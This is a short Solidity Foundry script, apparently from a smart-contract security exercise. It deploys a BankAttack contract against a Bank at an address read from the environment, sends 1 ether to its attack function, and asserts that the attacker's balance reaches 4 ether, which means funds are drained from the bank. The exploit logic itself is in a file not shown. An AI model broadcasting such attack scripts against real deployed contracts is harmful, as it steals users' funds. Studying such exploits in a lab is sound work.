// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Bank.sol";
import "../src/BankAttack.sol";

contract ExecuteAttack is Script {
    function run() external {


        vm.pauseGasMetering();
        address bankAddress = vm.envAddress("BANK_ADDRESS");
        // address attackerAddress = vm.envAddress("ATTACKER_ADDRESS");
        // address payable attackerPayableAddress = payable(attackerAddress);
        vm.startBroadcast();

        BankAttack attacker = new BankAttack(bankAddress);

        attacker.attack{value: 1 ether}();

        assert(attacker.getBalance() == 4 ether);

        vm.stopBroadcast();
    }
}
